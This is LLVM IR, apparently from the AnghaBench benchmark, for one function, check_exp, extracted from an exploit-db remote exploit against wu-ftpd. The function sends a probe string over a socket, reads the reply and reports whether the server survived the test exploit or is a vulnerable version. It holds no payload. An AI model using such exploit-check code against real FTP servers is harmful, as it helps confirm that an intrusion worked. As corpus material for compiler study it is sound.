; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_78.c_check_exp.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_78.c_check_exp.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@GET_R = common dso_local global i32 0, align 4
@stdout = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [30 x i8] c"\0A [+] Check exploit test ...\0A\00", align 1
@.str.1 = private unnamed_addr constant [6 x i8] c"X82\0D\0A\00", align 1
@NRL = common dso_local global i32 0, align 4
@SCS = common dso_local global i32 0, align 4
@CMD_ERROR = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [44 x i8] c" [X] After test exploit, wu-ftpd is alive.\0A\00", align 1
@FAD = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [39 x i8] c" [*] Ok, This is vulnerable version.\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @check_exp(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca i64, align 8
  %7 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %8 = load i32, i32* @GET_R, align 4
  %9 = zext i32 %8 to i64
  %10 = call i8* @llvm.stacksave()
  store i8* %10, i8** %5, align 8
  %11 = alloca i8, i64 %9, align 16
  store i64 %9, i64* %6, align 8
  %12 = load i32, i32* @stdout, align 4
  %13 = call i32 @fprintf(i32 %12, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str, i64 0, i64 0))
  %14 = load i32, i32* %3, align 4
  %15 = call i32 @strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i64 0, i64 0))
  %16 = load i32, i32* @NRL, align 4
  %17 = call i32 @send(i32 %14, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i64 0, i64 0), i32 %15, i32 %16)
  %18 = load i32, i32* @SCS, align 4
  %19 = call i32 @sleep(i32 %18)
  %20 = load i32, i32* @NRL, align 4
  %21 = trunc i64 %9 to i32
  %22 = call i32 @memset(i8* %11, i32 %20, i32 %21)
  %23 = load i32, i32* %3, align 4
  %24 = sub i64 %9, 1
  %25 = trunc i64 %24 to i32
  %26 = call i32 @read(i32 %23, i8* %11, i32 %25)
  store i32 %26, i32* %4, align 4
  %27 = load i32, i32* @CMD_ERROR, align 4
  %28 = call i64 @strstr(i8* %11, i32 %27)
  %29 = icmp ne i64 %28, 0
  br i1 %29, label %30, label %34

30:                                               ; preds = %1
  %31 = load i32, i32* @stdout, align 4
  %32 = call i32 @fprintf(i32 %31, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.2, i64 0, i64 0))
  %33 = load i32, i32* @FAD, align 4
  store i32 %33, i32* %2, align 4
  store i32 1, i32* %7, align 4
  br label %44

34:                                               ; preds = %1
  %35 = load i32, i32* %4, align 4
  %36 = load i32, i32* @NRL, align 4
  %37 = icmp sle i32 %35, %36
  br i1 %37, label %38, label %42

38:                                               ; preds = %34
  %39 = load i32, i32* @stdout, align 4
  %40 = call i32 @fprintf(i32 %39, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.3, i64 0, i64 0))
  %41 = load i32, i32* @SCS, align 4
  store i32 %41, i32* %2, align 4
  store i32 1, i32* %7, align 4
  br label %44

42:                                               ; preds = %34
  %43 = load i32, i32* @FAD, align 4
  store i32 %43, i32* %2, align 4
  store i32 1, i32* %7, align 4
  br label %44

44:                                               ; preds = %42, %38, %30
  %45 = load i8*, i8** %5, align 8
  call void @llvm.stackrestore(i8* %45)
  %46 = load i32, i32* %2, align 4
  ret i32 %46
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @fprintf(i32, i8*) #2

declare dso_local i32 @send(i32, i8*, i32, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @sleep(i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @read(i32, i8*, i32) #2

declare dso_local i64 @strstr(i8*, i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
